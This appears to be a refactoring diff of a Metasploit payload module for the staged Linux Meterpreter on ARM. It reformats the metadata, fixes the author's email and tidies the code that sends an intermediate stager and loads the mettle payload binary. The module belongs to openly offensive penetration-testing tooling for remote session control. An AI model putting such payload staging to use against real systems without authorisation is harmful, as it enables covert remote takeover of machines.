@@ -11,22 +11,25 @@ module MetasploitModule
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Linux Meterpreter',
-      'Description'   => 'Inject the mettle server payload (staged)',
-      'Author'        => [
-        'Adam Cammack <adam_cammack[at]rapid7.com'
-      ],
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_ARMLE,
-      'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_armle_Linux))
+    super(
+      update_info(
+        info,
+        'Name'          => 'Linux Meterpreter',
+        'Description'   => 'Inject the mettle server payload (staged)',
+        'Author'        => [
+          'Adam Cammack <adam_cammack[at]rapid7.com>'
+        ],
+        'Platform'      => 'linux',
+        'Arch'          => ARCH_ARMLE,
+        'License'       => MSF_LICENSE,
+        'Session'       => Msf::Sessions::Meterpreter_armle_Linux
+      )
+    )
   end
 
   def elf_ep(payload)
     elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
-    ep = elf.elf_header.e_entry
-    return ep
+    elf.elf_header.e_entry
   end
 
   def handle_intermediate_stage(conn, payload)
@@ -70,15 +73,12 @@ module MetasploitModule
       entry_offset
     ].pack('V*')
 
-    print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
-
-    conn.put [midstager.length].pack('V')
-    conn.put midstager
-
-    true
+    vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
+    conn.put([midstager.length].pack('V'))
+    conn.put(midstager) == midstager.length
   end
 
-  def generate_stage(opts={})
+  def generate_stage(_opts = {})
     MetasploitPayloads::Mettle.read('arm-linux-musleabi', 'mettle.bin')
   end
 end
